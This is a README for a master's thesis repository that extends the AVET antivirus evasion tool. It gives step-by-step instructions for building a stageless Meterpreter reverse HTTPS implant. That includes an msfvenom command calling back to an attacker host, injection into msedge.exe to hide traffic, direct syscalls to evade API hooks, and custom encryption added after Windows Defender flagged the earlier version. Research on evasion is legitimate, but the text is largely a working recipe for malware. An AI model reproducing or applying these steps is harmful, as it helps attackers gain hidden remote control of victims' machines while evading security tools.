# Repository Overview

This repository hosts the implementation of Ayoub's Master Thesis, which explores Malware Obfuscation and Evasion Techniques. The primary focus is on developing methods to bypass the CAPEv2 sandbox.

The repository also enhances the AntiVirus Evasion Tool (AVET) with several notable improvements:

- Introduction of a script to build a **stageless** Meterpreter performing a shellcode injection.
- Development of a shellcode injection method that identifies the **target process by name**, automatically determining the PID. This approach is more suitable for Red Teaming scenarios than the original AVET method, which required a *PID to be specified at the command line*.
- Addition of a shellcode injection technique that uses **dynamic API loading**.
- Implementation of an advanced version that uses **dynamic loading of NTAPIs**.
- Addition of two versions that uses **direct syscall** using Syswhisper2 and Syswhisper3 (both are compatible with MinGW which is used by AVET).
- Fixed a bug in the `static_from_here` function. Previously, this function included and called `static_from_file`. However, due to the use of `#pragma once`, macros defined specifically for `static_from_here` were not available in the scope of `static_from_file` if `static_from_file` was included before its invocation by `static_from_here`.
- A basic custom encryption using arithmetic operations has been added to bypass static detection since the encryption performed by AVET, including a basic XOR, are flagged by AV softwares (Tested against Windows Defender).


## Author

BOUHNINE Ayoub

## Repository Structure

The repository is organized as follows:

- **AVET Folder:** Hosts the extended version of AVET (AntiVirus Evasion Tool) taken from [their Github](https://github.com/govolution/avet).
- **Custom Payloads:** Contains various custom payloads that has been tested against CAPEv2 before being integrated into AVET.

## Research Paper

The thesis paper is available in the [paper folder](./paper/thesis.pdf).

## Installing AVET

__The Installtion Instruction applies for Kali 64bit and tdm-gcc!__

To install AVET, the following command needs to be executed:
```bash
./setup.sh
```

This will begin by setting up Wine and installing TDM-GCC on your system. 

You will need to interact with the TDM-GCC installer's graphical interface, but the default options are typically enough. 

Additionally, the script will ask whether you wish to install the necessary dependencies for AVET to use certain build scripts. 
These dependencies will be organized into individual directories adjacent to the AVET folder.

Dependencies will take the latest releases of:
- [pe_to_shellcode](https://github.com/hasherezade/pe_to_shellcode)
- [mimikatz](https://github.com/gentilkiwi/mimikatz)
- [DKMC](https://github.com/Mr-Un1k0d3r/DKMC)


## Evasion Techniques

The samples, located in the `samples/` directory of this repository, use several evasion techniques:

- **Obfuscation:** This involves a stageless Meterpreter x64 reverse HTTPS payload that uses both the x64/xor encoding from msfvenom and a custom basic XOR encryption. This technique is implemented in all the samples.
- **Shellcode Injection:** The Meterpreter payload is injected into **msedge.exe**. This could deceive security solutions since Microsoft Edge frequently performs HTTPS requests, thereby hidding the Meterpreter traffic within the regular Microsoft Edge traffic. This is implemented in all the samples.
- **Basic API calls:** Although this is not an evasion technique, the sample implementing this serves as a baseline for other samples. It is implemented in the `Shellcode_injection/` directory.
- **Dynamic API Loading:** This technique conceals the APIs from the Import Address Table by dynamically loading the APIs. This is implemented in the sample `Shellcode_injection_dynamic_lib`.
- **Dynamic NTAPIs Loading:** This is a more advance technique which involves dynamically loading NTAPIs instead of the classical APIs, potentially evading security solutions that do not hook the `ntdll.dll`. This is implemented in the `Shellcode_injection_NTAPIs` directory.
- **Evasion of API Hooks by Direct Syscalls:** This technique is used to bypass the API hooking of classical APIs and NTAPIs through Direct Syscalls. This is implemented in the sample `Shellcode_injection_syscalls`, compatible with Visual Studio, `Shellcode_injection_syscalls_mingw`, compatible with MinGW
and `Shellcode_injection_syscalls_mingw_vsc` for a version compatible with both Visual Studio and MinGW.

These techniques have been integrated by the author within the AVET framework available on this repository. For syscall generation, the tool **SysWhispers3** is used for the `Shellcode_injection_syscalls` and `Shellcode_injection_syscalls_mingw` samples. Whereas for the `Shellcode_injection_syscalls_mingw_vsc` sample, **Syswhispers2** is used. These tools are availble at: [SysWhispers3 on GitHub](https://github.com/klezVirus/SysWhispers3) and [SysWhispers2 on GitHub](https://github.com/jthuraisamy/SysWhispers2).

## Modification of the payload

The payload employed is a stageless Meterpreter x64 reverse HTTPS payload, using the x64/xor encoder from msfvenom. Additionally, an extra layer of encryption has been implemented, which is further detailed in the [in the section _Utils_](#utils). 

**Note**: To use the samples with your own IP address, the payload must be replaced.

## Utils

We have introduced custom encryption techniques that have been integrated into AVET. Its default encryption routines are well-known to antivirus (AV) vendors and have been widely used. These custom encryption methods, along with their corresponding decryption routines, are designed to avoid detection by AVET's standard encryption methods.

**Important Remark**: Our custom XOR encryption is detectable by Microsoft Defender when implemented with AVET. As a result, we have added a basic arithmetic encryption to circumvent static detection [as described in section _Custom obfucation of Meterpreter payloads_](#custom-obfucation-of-meterpreter-payloads).

### XORing Meterpreter payloads

For XORing the payload we used the code available on `XOR_encryptor`.

Follow these steps:

- Generate your payload with **msfvenom** : `msfvenom -p windows/x64/meterpreter_reverse_https lhost=eth0 lport=443 -e x64/xor -f c > payload.h`
- Use the newly generated file as input for the `XOR_encryptor.exe` executable with the following command: `\XOR_encryptor.exe payload.h <output_file_name>`. For example, in our case, the output filename is `buffer.h `
- Import the newly created file into Visual Studio and include it in your chosen sample.

On a Kali machine, ensure `wine` is installed. You can then execute the command with `wine` as a prefix to generate your XORed payload.

### Custom obfucation of Meterpreter payloads

We introduced an additional technique to obfuscate the payload. Indeed, upon integrating our custom XOR encryption routine into AVET, we discovered that Microsoft Defender detected it as `Trojan:Win64/CryptInject.VZ!MTB`. This detection likely occurred because the sample already contained AVET code, and the XOR encryption was added on top of it which could lead to suspicious code by AV vendors.

To apply this technique, follow the steps outlined in [in the section _XORing Meterpreter payloads_](#xoring-meterpreter-payloads), but use `custom_encryptor` instead of `XOR_encryptor`.


### For generating direct syscalls using Syswhisper3

In a Visual Studio Setup:

- move to the `syswhispers` directory
- `python.exe syswhispers.py -f NtQuerySystemInformation,NtOpenProcess,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx,NtWaitForSingleObject,NtClose -o output/syscalls`
- Copy the generated H/C/ASM files into the project folder.
- In Visual Studio, go to `Solution Explorer` -> Right click on the project name -> Build Dependencies -> Build Customizations... and enable MASM.
- In the Solution Explorer, add the .h and .c/.asm files to the project as header and source files, respectively.
- Go to the properties of the ASM file, and set the Item Type to Microsoft Macro Assembler.
- Compile it

In a MinGW Setup:

- move to the `syswhispers` directory
- `python.exe syswhispers.py -c mingw -f NtQuerySystemInformation,NtOpenProcess,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx,NtWaitForSingleObject,NtClose -o output/syscalls` with the parameter `-c mingw` specifying that it should generate code compilable with this compiler.
- Copy the generated H/C files into the project folder.
- then execute the command `x86_64-w64-mingw32-gcc syscalls.c main.c -o main.exe -masm=intel -Wall` to compile your code.

You should be ready to go !

Don't forget to properly call the functions generated `Sw3...()`

Sometimes some adjustement is needed to properly compile the project, make sure they are no redefinition of the same structures. The samples I provided are fully working  (they compile without any issue)

### For generating direct syscalls using Syswhisper2

In a Visual Studio Setup:

- move to the `syswhispers` directory
- `python.exe syswhispers.py -f NtQuerySystemInformation,NtOpenProcess,NtAllocateVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx,NtWaitForSingleObject,NtClose -o output/syscalls`
- Copy the generated H/C/ASM files into the project folder. For the ASM files, only the `.std.x64` version of the files need to be added not the `.rnd.x64` nor the `.std.x86` nor the `.rnd.x86`.
- In Visual Studio, go to `Solution Explorer` -> Right click on the project name -> Build Dependencies -> Build Customizations... and enable MASM.
- In the Solution Explorer, add the .h and .c/.asm files to the project as header and source files, respectively.
- Go to the properties of the ASM file, and set the Item Type to Microsoft Macro Assembler.
- Compile it

You should be ready to go !

In a MinGW Setup, executes the following commands:

```
x86_64-w64-mingw32-gcc -m64 -c main.c syscalls.c -Wall -shared
nasm -f win64 -o syscallsstubs.std.x64.o syscallsstubs.std.x64.nasm
x86_64-w64-mingw32-gcc *.o -o temp.exe
x86_64-w64-mingw32-strip -s temp.exe -o example.exe
rm -rf *.o temp.exe
```

Don't forget to properly call the functions generated `Sw3...()`

Sometimes some adjustement is needed to properly compile the project, make sure they are no redefinition of the same structures. The samples I provided are fully working  (they compile without any issue)

## Extension of AVET

This section outlines the scripts and files that have been added:

**In the `build/` directory:**
- `build_injectshc_xor_revhttps_stageless_win64.sh` ... [details here]
- `build_injectshc_custom_xor_revhttps_stageless_win64.sh` that has a custom XOR encryption ... [details here]

**In the `source/implementations/payload_execution_method` directory:**
- `inject_shellcode_procname.h` ... [details here]

**Note:**
- The `static_from_here.h` script from `source/implementations/retrieve_data/` has been modified to address the bug fix detailed earlier.
